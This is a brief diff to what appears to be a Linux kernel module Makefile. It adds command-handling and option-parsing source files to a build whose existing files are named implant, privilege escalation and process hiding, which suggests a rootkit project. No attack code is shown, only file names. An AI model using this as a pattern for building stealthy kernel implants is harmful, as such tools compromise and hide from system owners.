@@ -16,6 +16,8 @@ obj-m := $(MODNAME).o
 SRCS += src/implant.c
 SRCS += src/privilege_escalation.c
 SRCS += src/hide_proc.c
+SRCS += src/commands.c
+SRCS += src/ketopt.c
 
 OBJS := $(SRCS:.c=.o)
 
